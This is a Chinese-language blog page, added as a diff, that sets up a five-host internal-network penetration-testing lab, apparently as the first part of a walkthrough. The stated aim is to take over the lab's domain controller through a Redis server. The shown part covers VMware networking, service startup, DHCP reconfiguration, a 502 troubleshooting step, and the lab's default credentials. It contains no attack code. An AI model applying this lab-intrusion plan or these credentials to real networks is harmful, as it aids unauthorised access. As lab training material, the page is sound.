@@ -1,0 +1,1514 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="安全, 渗透测试, Web安全">
+    
+    
+    <meta name="author" content="W1nner丶">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes ASAP (before DOMContentLoaded)
+            (function() {
+                const addBodyClass = () => {
+                    const b = document.body;
+                    if (!b) return false;
+                    b.classList.add(theme + "-mode");
+                    return true;
+                };
+
+                // Try immediately
+                if (addBodyClass()) return;
+
+                // Observe until body exists
+                const mo = new MutationObserver(() => {
+                    if (addBodyClass()) mo.disconnect();
+                });
+                mo.observe(document.documentElement, { childList: true, subtree: true });
+            })();
+        })();
+    </script>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://tamoon1.github.io/2026/06/04/internal-network-6/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Internal-network-6">
+<meta property="og:url" content="https://tamoon1.github.io/2026/06/04/Internal-network-6/index.html">
+<meta property="og:site_name" content="W1nner&#39;s Blog">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tamoon1.github.io/images/redefine-og.webp">
+<meta property="article:published_time" content="2026-06-04T04:35:28.000Z">
+<meta property="article:modified_time" content="2026-06-04T04:38:19.305Z">
+<meta property="article:author" content="W1nner丶">
+<meta property="article:tag" content="Internal network penetration">
+<meta property="article:tag" content="内网横向提权">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tamoon1.github.io/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="../../../../images/redefine-favicon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="../../../../images/redefine-favicon.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="../../../../images/redefine-favicon.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Internal-network-6 | W1nner丶的博客
+        
+    </title>
+
+    
+<link rel="stylesheet" href="fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="../../../../css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"tamoon1.github.io","root":"/","language":"zh-CN","path":"search.json"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"W1nner丶's Studio","subtitle":{"text":[],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":[{"icon":"fa-brands fa-github","url":null},{"icon":"fa-brands fa-twitter","url":null},{"icon":"fa-solid fa-at","url":"you@example.com"},{"icon":"fa-brands fa-telegram","url":null},{"icon":"/images/custom-icon.svg","url":null}],"qrs":[{"icon":"fa-brands fa-weixin","qr":null},{"icon":"/images/custom-icon.svg","qr":null}]}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1","theme":{"light":"default","dark":"dark"}}},"version":"2.9.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur","masonry":{"batch_size":12,"initial_batch_size":24}},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footer":{"runtime":true,"icon":"<i class=\"fa-solid fa-heart fa-beat\" style=\"--fa-animation-duration: 0.5s; color: #f54545\"></i>","start":"2022/8/17 11:45:14","statistics":true,"customize":null,"icp":{"enable":false,"number":null,"url":null}},"footerStart":"2022/8/17 11:45:14","mermaid":{"style":{"light":"default","dark":"dark"}}};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.i18n = {"search":"站内搜索您需要的内容...","toc":"目录","prev":"上一页","next":"下一页","prev_posts":"上一篇","next_posts":"下一篇","page":"第 %d 页","recent_posts":"最新文章","share":"分享","powered_by":"由 %s 驱动","theme":"主题","rss_feed":"RSS Feed","category":"分类","categories":"分类","tag":"标签","tags":"标签","post":"文章","posts":"文章","tagcloud":"标签云","comment":"评论","comments":"评论","top":"置顶","sticky":"置顶","go-back-home":"回到首页","masonry_loading":"照片加载中...","image_viewer":"图片查看器","close":"关闭","exif":{"title":"EXIF","cards":{"camera":"相机","lens":"镜头","exposure":"曝光","other":"其他"},"fields":{"make":"品牌","model":"机型","date_taken":"拍摄时间","lens_model":"镜头","focal_length":"焦距","focus_mode":"对焦模式","shutter":"快门","aperture":"光圈","iso":"感光度","exposure_program":"曝光程序","exposure_compensation":"曝光补偿","metering_mode":"测光模式","flash":"闪光灯","white_balance":"白平衡","latitude":"纬度","longitude":"经度","altitude":"海拔"},"status":{"loading":"加载中...","no_exif":"无 EXIF 信息","library_missing":"EXIF 库未加载","image_source_missing":"图片地址不可用","unavailable":"EXIF 不可用（可能被 CORS 阻止或缺少元数据）","flag_unavailable":"EXIF 不可用"}},"home":"首页","archive":"归档","archives":"归档","about":"关于","links":"链接","link":"链接","friends":"友情链接","friend":"友情链接","timeline":"时间轴","shuoshuo":"说说","bookmarks":"书签","site_uv":"访问人数","site_pv":"总访问量","read_more":"阅读全文","wordcount":"字","min2read":"分钟","changelog":"更新日志","status":"状态","runtime":"博客已运行","days":"天","hours":"小时","minutes":"分钟","seconds":"秒","optimized_by":"并由 Evan 进行优化","rights":"版权所有","site_posts":"共撰写了 %s 篇文章","site_wordcount":"共 %s 字","copyright":{"title":"标题","author":"作者","link":"链接","create_time":"创建于","update_time":"更新于","license_title":"版权声明","license_content":"本文章采用 %s 进行许可。","all_rights_reserved":"版权所有 &#169 %s，禁止转载。","public_domain":"本文为公有领域作品，可自由转载、引用。"},"ago":{"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"},"create_time":"创建","update_time":"更新","expired":"这篇文章最后更新于 %s 天前，内容可能已经过时。"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                W1nner丶的博客
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="../../../../index.html"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    首页
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="../../../../index.html"
+                        >
+                            <span>
+                                首页
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="../../../../tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
+        <div class="label text-third-text-color text-sm">标签</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="../../../../categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">2</div>
+        <div class="label text-third-text-color text-sm">分类</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="../../../../archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">8</div>
+        <div class="label text-third-text-color text-sm">文章</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Internal-network-6</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] shrink-0 rounded-medium border border-border-color p-px">
+				<img src="../../../../images/touxiang.jpeg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">W1nner丶</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-06-04 12:35:28</span>
+        <span class="mobile">2026-06-04 12:35:28</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-06-04 12:38:19</span>
+            <span class="mobile">2026-06-04 12:38:19</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="../../../../categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/">技术分享</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="../../../../tags/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%8F%90%E6%9D%83/">内网横向提权</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="../../../../tags/Internal-network-penetration/">Internal network penetration</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<blockquote>
+<p>提示：文章写完后，目录可以自动生成，如何生成可参考右边的帮助文档</p>
+</blockquote>
+<blockquote>
+<p>本人CSDN博客：<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73812072?spm=1011.2415.3001.5343" >https://blog.csdn.net/m0_73812072?spm=1011.2415.3001.5343<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> </p>
+</blockquote>
+<hr>
+<h2 id="靶场介绍"><a href="#靶场介绍" class="headerlink" title="靶场介绍"></a>靶场介绍</h2><p>本次环境种，将对由5台目标主机组成的三层网络环境进行渗透，三层网络由DMZ区、第二层网络、第三层不连通外网的网络组成。</p>
+<ul>
+<li>DMZ区存在一台Ubuntu系统的Redis服务器；</li>
+<li>第二层网络存在一台Ubuntu系统的Docker服务器和一台Windows 7系统的OA服务器；</li>
+<li>第三层网络则由一台域控服务器和一台域内主机组成；</li>
+</ul>
+<blockquote>
+<p>整个靶场环境一共五个靶机（总共27.8 GB），分别位于三层网络环境中；</p>
+</blockquote>
+<hr>
+<h3 id="网络拓扑结构"><a href="#网络拓扑结构" class="headerlink" title="网络拓扑结构"></a>网络拓扑结构</h3><p>该环境网络拓扑如图：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="2f5b99f4bd0049a38d7b7a89380b0a58.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<ul>
+<li>Ubuntu1：192.168.44.137 &#x2F; 10.10.10.28</li>
+<li>Ubuntu2：10.10.10.29 &#x2F; 10.10.20.13</li>
+<li>Windows1：10.10.10.30 &#x2F; 10.10.20.14</li>
+<li>Windows2：10.10.20.15</li>
+<li>域控DC：10.10.20.16</li>
+</ul>
+<p>将通过DMZ区的<strong>Redis服务器</strong>作为入口点，逐步进行渗透测试操作，并最终拿到域控主机权限，实现对该环境的完全掌控。</p>
+<h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>在Vmware中新增两个虚拟网卡VMnet9、VMnet11。<br>（1）VMnet8设为默认的NAT模式，作为<strong>DMZ区网段</strong>；<br>（2）VMnet11设为仅主机模式，作为<strong>第一层内网</strong>网段；<br>（3）VMnet9设为仅主机模式，作为<strong>第二层内网</strong>网段；</p>
+<p>其中，三个网段的IP分别如下：</p>
+<ul>
+<li>DMZ区网段：<code>192.168.44.0/24</code></li>
+<li>一层内网：<code>10.10.10.0/24</code></li>
+<li>二层内网：<code>10.10.20.0/24</code></li>
+</ul>
+<p>将VMnet11作为第二层网络的网卡，VMnet9作为第三层网络的网卡。这样，第二层网络中的所有主机皆可以上网，但是位于第三层网络中的所有主机都不与外网相连通，不能上网。</p>
+<h3 id="服务配置"><a href="#服务配置" class="headerlink" title="服务配置"></a>服务配置</h3><p><code>靶场中各个主机都运行着相应的服务并且没有自启功能，如果你关闭了靶机，再次启动时还需要在相应的主机上启动靶机服务：</code></p>
+<ul>
+<li>DMZ区的 Ubuntu 需要启动redis和nginx服务：</li>
+</ul>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">redis-server /etc/redis.conf</span><br><span class="line">/usr/sbin/nginx -c /etc/nginx/nginx.conf</span><br><span class="line">iptables -F</span><br></pre></td></tr></table></figure></div>
+<p>结果如下：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="9dbf894854024670b6cfd1ab31f95f76.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<ul>
+<li>第二层网络的 Ubuntu需要启动docker容器：</li>
+</ul>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> service docker start</span><br><span class="line"><span class="built_in">sudo</span> docker start 8e172820ac78</span><br></pre></td></tr></table></figure></div>
+<p>结果如下：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="96b08c1f2a8b4cad97fcd4974af69e90.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<ul>
+<li>第三层网络的 Windows 7 （PC 1）需要启动通达OA：</li>
+</ul>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\MYOA\bin\AutoConfig.exe</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="域用户信息"><a href="#域用户信息" class="headerlink" title="域用户信息"></a>域用户信息</h3><p>域用户账户和密码如下：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- Administrator：Whoami2021</span><br><span class="line">- <span class="built_in">whoami</span>：Whoami2021</span><br><span class="line">- bunny：Bunny2021</span><br><span class="line">- moretz：Moretz2021</span><br></pre></td></tr></table></figure></div>
+<p>其他主机的正常登陆账号为：</p>
+<p>（1）Ubuntu 1：<strong>web</strong> &#x2F; <code>web2021</code></p>
+<p>（2）Ubuntu 2：<strong>ubuntu</strong> &#x2F; <code>ubuntu</code></p>
+<p>（3）通达OA账户：<strong>admin</strong> &#x2F; <code>admin657260</code></p>
+<h2 id="靶机配置"><a href="#靶机配置" class="headerlink" title="靶机配置"></a>靶机配置</h2><h3 id="Ubuntu1网络配置"><a href="#Ubuntu1网络配置" class="headerlink" title="Ubuntu1网络配置"></a>Ubuntu1网络配置</h3><p>如果设置的网段并没有完全符合之前的设置，比如我的10.10.10.0&#x2F;24变成了192.168.52.0&#x2F;24，就是因为作者在主机上设置了<strong>静态IP</strong>：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="c6c404b77c3f48e78456b5ad9bfcd217.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>解决方法：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 备份原配置文件（重要，防止改错）</span></span><br><span class="line"><span class="built_in">cp</span> /etc/netplan/01-network-manager-all.yaml /etc/netplan/01-network-manager-all.yaml.bak</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编辑配置文件</span></span><br><span class="line">nano /etc/netplan/01-network-manager-all.yaml</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改为下面的配置</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Let NetworkManager manage all devices on this system</span></span><br><span class="line">network:</span><br><span class="line">    version: 2</span><br><span class="line">    renderer: networkd</span><br><span class="line">    ethernets:</span><br><span class="line">       ens33:</span><br><span class="line">          dhcp4: <span class="literal">true</span></span><br><span class="line">          optional: <span class="literal">true</span></span><br><span class="line">       ens38:</span><br><span class="line">          dhcp4: <span class="literal">true</span>  <span class="comment"># 核心修改：从 no 改为 true，开启自动获取</span></span><br><span class="line">          optional: <span class="literal">true</span>  <span class="comment"># 只保留一行 optional 即可</span></span><br><span class="line">          <span class="comment"># 注释/删除所有静态配置（addresses/gateway4/nameservers）</span></span><br></pre></td></tr></table></figure></div>
+
+<p>按上面的正确内容修改（删除 <code>nameservers</code> 段、把 <code>dhcp4: no</code> 改 <code>true</code>、删除重复的 <code>optional: true</code>）</p>
+<p>然后应用配置：<code>sudo netplan apply </code> 即可；</p>
+<p>结果如下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="4272d8741cdc4ef8acac7e8b183bc309.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<h3 id="Ubuntu2网络配置"><a href="#Ubuntu2网络配置" class="headerlink" title="Ubuntu2网络配置"></a>Ubuntu2网络配置</h3><p>我们打开靶机发现IP地址也都是静态的：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="8a581a50065c47e19d95af3be120e1c0.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>同理还是修改配置文件：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 备份原有配置（重要）</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">cp</span> /etc/network/interfaces /etc/network/interfaces.bak</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编辑传统网络配置文件</span></span><br><span class="line"><span class="built_in">sudo</span> nano /etc/network/interfaces</span><br><span class="line"></span><br><span class="line"><span class="comment"># 替换为以下内容（实现双网卡自动获取 IP）</span></span><br><span class="line">root@ubuntu:~# <span class="built_in">cat</span> /etc/network/interfaces</span><br><span class="line"><span class="comment"># interfaces(5) file used by ifup(8) and ifdown(8)</span></span><br><span class="line"></span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"></span><br><span class="line">auto eth0</span><br><span class="line">iface eth0 inet dhcp</span><br><span class="line"></span><br><span class="line">auto eth1</span><br><span class="line">iface eth1 inet dhcp</span><br><span class="line">root@ubuntu:~# </span><br></pre></td></tr></table></figure></div>
+<p>随后重启网络让配置生效：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> service networking restart</span><br><span class="line"><span class="comment"># 或手动刷新 DHCP（确保立即获取新 IP）</span></span><br><span class="line"><span class="built_in">sudo</span> dhclient -r eth0 &amp;&amp; <span class="built_in">sudo</span> dhclient eth0</span><br><span class="line"><span class="built_in">sudo</span> dhclient -r eth1 &amp;&amp; <span class="built_in">sudo</span> dhclient eth1</span><br></pre></td></tr></table></figure></div>
+
+<p>成功配置：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="c476641677fd4082b1dd041a6209d9e5.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<h3 id="Windows7-域控DC网络配置"><a href="#Windows7-域控DC网络配置" class="headerlink" title="Windows7 + 域控DC网络配置"></a>Windows7 + 域控DC网络配置</h3><p>首先打开控制面板：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="cbb645321d6f4c2189e1c1282e8887d9.png"
+                      alt="在这里插入图片描述"
+                ><br>双击IPv4选项，自动获得：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="b56bc974625f437b87a5c6ad6665aa5e.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>随后成功配置：</p>
+<p>第一台Windows7主机：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="cd3eda597a934a8096fb0d39bf8accad.png"
+                      alt="在这里插入图片描述"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="956848e98f6c413c94319e8bcff7d76b.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>第二台Windows7主机：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="3cd1a72473004a92a5aeaa5a73a1aac4.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>域控DC网络配置，操作如下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="a04a1600ce83440eaa13feb76b9cddba.png"
+                      alt="在这里插入图片描述"
+                ><br>成功配置：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="a4db02a92db84ddaaffa8f325e85988b.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<blockquote>
+<p>至此，我们的前期配置准备的差不多了，直接开始本地靶场之旅；</p>
+<ul>
+<li>Ubuntu1：192.168.44.137 &#x2F; 10.10.10.28</li>
+<li>Ubuntu2：10.10.10.29 &#x2F; 10.10.20.13</li>
+<li>Windows1：10.10.10.30 &#x2F; 10.10.20.14</li>
+<li>Windows2：10.10.20.15</li>
+<li>域控DC：10.10.20.16</li>
+</ul>
+</blockquote>
+<h3 id="解决问题：访问返回502-Bad-Gateway-耗时40分钟"><a href="#解决问题：访问返回502-Bad-Gateway-耗时40分钟" class="headerlink" title="解决问题：访问返回502 Bad Gateway(耗时40分钟)"></a>解决问题：访问返回502 Bad Gateway(耗时40分钟)</h3><p><strong>问题现象：</strong><br>访问 <code>http://192.168.44.137:81/</code> 返回 502</p>
+<p><strong>问题原因：</strong><br>Nginx 反向代理目标写错，实际后端服务运行在 Docker 容器映射的 8000 端口，而不是默认 80 端口</p>
+<p><strong>排查步骤：</strong></p>
+<ol>
+<li>在 <code>Ubuntu2</code> 查看容器端口：</li>
+</ol>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure></div>
+
+<p>确认存在：</p>
